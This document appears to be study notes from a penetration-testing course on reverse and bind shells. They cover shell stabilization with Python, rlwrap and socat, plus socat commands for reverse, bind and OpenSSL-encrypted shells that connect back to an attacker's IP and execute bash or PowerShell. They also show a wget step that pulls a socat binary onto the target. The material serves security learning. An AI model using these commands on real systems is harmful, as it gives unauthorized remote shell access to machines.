When exploiting targets there are two main types of shells:

1) Reverse Shell
2) Binding Shell

### Reverse Shell 
- Opened when a target is forced to execute code that connects back to your computer
- Uses a *listener* to receive connection from a targeted computer

### Bind Shells
- Executes code to start a listener attached to a shell directly on a target

### Shell Stabilization

Technique 1: Python

1. Use `python -c 'import pty;pty.spawn("/bin/bash")'`, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace `python` with `python2` or `python3` as required. The shell will look a bit prettier, but still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
2.  `export TERM=xterm` -- this will give access to term commands such as `clear`.
3. Finally (and most importantly) background the shell using Ctrl + Z. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

Technique 2: rlwrap

1. first install it with `sudo apt install rlwrap`
	- gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell_;_ however, some manual stabilization must still be utilized if you want to be able to use Ctrl + C inside the shell
2. To use rlwrap, we invoke a slightly different listener:
	- `rlwrap nc -lvnp <port>`

Technique 3: Socat

 - Only viable on Linux machines
 
 The third easy way to stabilize a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`).


### SoCat

Commands:

	socat TCP-L:<port> -  creates a reverse shell listener

On Windows we would use this command to connect back:

`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`

This is the equivalent command for a Linux Target:

`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`

Bind Shells:
On a Linux target we would use the following command:

`socat TCP-L:<PORT> EXEC:"bash -li"`  

On a Windows target we would use this command for our listener:

`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`  

We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.  

Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.

`socat TCP:<TARGET-IP>:<TARGET-PORT> -`


#### Encrypted Shells

Steps to create an encrypte shell in Socat (reverse shell):
1) Generate a certificate for the encrypted shell
	Ex. openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt

2) Merge the two created files into a single .pem file
	Ex. cat shell.key shell.crt > shell.pem

3) Set up the reverse shell listener
	Ex. socat OPENSSL-LISTEN:PORT,cert=shell.pem,verify=0 -

4) Connect back to another machine
	Ex. socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash

* The above steps would also work for a bind shell *